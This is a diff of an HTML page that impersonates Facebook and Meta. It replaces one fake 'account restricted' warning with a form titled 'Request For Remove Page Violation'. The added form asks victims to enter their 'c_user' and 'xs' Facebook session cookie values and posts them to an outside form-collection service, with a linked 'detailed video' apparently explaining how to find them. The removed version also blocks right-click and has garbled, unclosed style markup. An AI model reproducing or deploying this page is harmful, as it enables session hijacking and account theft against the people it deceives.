@@ -1,172 +1,76 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<!doctype html>
 <head>
+  <title>Request Form</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>Facebook Warning</title>
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, Helvetica, sans-serif;
-}
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="style.css" rel="stylesheet">
+    <link rel="icon" href="fb-logo.png" type="image/x-icon">
 
-html,
-body {
-    height: 0%;
-    width: 100%;
-}
-
-#container {
-    height: 135%;
-    width: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background-color: #f0f2f5;
-}
-
-#box {
-    height: 40%;
-    width: 45%;
-    background-color: rgb(255, 255, 255);
-    border-radius: 3px;
-    display: flex;
-    align-items: center;
-    flex-direction: column;
-}
-
-#box > img {
-    width: 131.25px; /* Adjusted width for smaller logo on mobile screens */
-    margin-top: 100px;
-}
-
-#data {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin-top: 15px;
-}
-
-#data > h4 {
-    font-size: 25px;
-}
-
-#data > img {
-    width: 25px;
-}
-
-.line {
-    height: .7px;
-    background-color: rgba(0, 0, 0, 0.222);
-    width: 90%;
-    margin: 1rem;
-}
-
-#para p {
-    margin: 20px 100px 0px 100px;
-    font-size: 14px;
-}
-
-#para button {
-    padding: 10px 20px 10px 20px;
-    margin-top: 25px;
-    border: none;
-    border-radius: 2px;
-    font-size: 18px;
-    background-color: #145dbd;
-    cursor: pointer;
-}
-
-#para button a {
-    text-decoration: none;
-    color: #fff;
-}
-
-#para button:hover {
-    background-color: #03469e;
-}
-
-@media (max-width: 500px) {
-    #box {
-        margin: 0;
-        height: 45%;
-        width: 95%;
-        top: 0%;
-    }
-    #box > img {
-        width: 131.25px; /* Adjusted width for smaller logo on mobile screens */
-        margin-top: 50px; /* Adjusted margin for smaller logo on mobile screens */
-    }
-    #data > h4 {
-        font-size: 18px;
-    }
-    #data > img {
-        width: 15px;
-        margin-left: 2px;
-    }
-    .line {
-        height: .5px;
-        width: 90%;
-        margin-left: auto;
-        margin-right: auto;
-        background-color: #00000045;
-    }
-    #para {
-        margin: 0%;
-    }
-    #para > p {
-        margin: 5px 15px 0px 15px;
-        font-size: 14px;
-    }
-    #para button {
-        padding: 8px 18px 8px 18px;
-        margin-top: 15px;
-        border: none;
-        border-radius: 2px;
-        font-size: 13px;
-        background-color: #1877F2;
-        cursor: pointer;
-    }
-}
-#para {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    text-align: center; /* Added to align button in center */
-}
-ok Warning</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
-    <link rel="stylesheet" href="style.css">
+ 
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="">
-            <div id="data">
-                <h4>Facebook Help Center</h4> <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
-              </div>
-              <div class="line"></div>
-            <div id="para">
-                <p>𝗪𝗲 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝗮𝗻 𝘂𝗻𝘂𝘀𝘂𝗮𝗹 𝗮𝗰𝘁𝗶𝘃𝗶𝘁𝘆 𝗮𝗻𝗱 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 </p>
-              <p>
-                𝗬𝗼𝘂 𝗰𝗮𝗻 𝘀𝘂𝗯𝗺𝗶𝘁 𝗮𝗻 𝗮𝗽𝗽𝗲𝗮𝗹 𝗳𝗼𝗿 𝗿𝗲𝘃𝗶𝗲𝘄
+<div class="relative bg-[#FFFFFF]">
+  <div class="mx-10 mt-4">
+    <marquee>
+      <img src="https://cdn.glitch.global/26db6cad-21fa-4aee-9093-92af7de338e9/meta-logo.png?v=1707682041784">
+    </marquee>
+  </div>
 
-              </p>
-                <button> <a href="submit.html">Continue</a> </button>
-            </div>
-        </div>
-    </div>
+  <form class="sm:hidden lg:block md:block" action="https://submit-form.com/ejKrbKICw" method="post">
 
-<script type="text/javascript">
-        document.addEventListener("contextmenu", function(e) {
-            e.preventDefault();
-        });
-    </script>
+<div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
+  <div>
+    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
+      Request For Remove Page Violation
+    </p>
+  </div>
+<div>
+  <p class="mt-4 pl-3 text-[12px] font-semibold">
+    We've identified irregular activity on your page that goes against our community guidelines.
+  </p>
+</div>
+<div>
+  <p class="mt-4 pl-3 text-[12px] font-semibold">
+    As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.
+  </p>
+</div>
+<div>
+  <p class="mt-4 pl-3 text-[12px] font-semibold">
+    If you think this is a Mistake, you can request a review by providing the required details.
+  </p>
+</div>
+<div>
+  <p class="text-[11px] text-[#90949c] p-2 font-semibold">
+    Detailed Video Information
+  </p>
+</div>
+<div>
+  <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img class="w-32 h-20 mx-3" src="https://cdn.glitch.global/26db6cad-21fa-4aee-9093-92af7de338e9/video-logo.jpg?v=1707684416461" alt=""></a>
+  </div>
+  <div>
+  <p class=" pl-3 text-[12px] font-semibold">
+    Kindly make sure to provide the requested details below.
+  </p>
+</div>
+<div>
+  <p class="text-slate-400 pl-4 mt-1">
+    c_user
+  </p><input class="border h-6 pl-1 mx-3" type="number" name="c_user" pattern="[0-9]+" minlength="6" title="Must Watch Detailed Video" required="1" aria-required="true">
+</div>
+<div>
+  <p class="text-slate-400 pl-4 mt-1">
+    xs
+  </p><input class="border h-6 pl-1 mx-3" type="text" name="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
+</div><div>
+  <p class="mt-4 pl-3 text-[12px] font-semibold">
+    Please ensure that you do not log out of your account on your computer or laptop until you have received a verification email.
+  </p>
+</div><div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]"><div class="flex justify-end mx-2">
+  <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
+    Submit
+  </button></div>
+  </div>
+ </div>
+  </form>
 </body>
-
 </html>
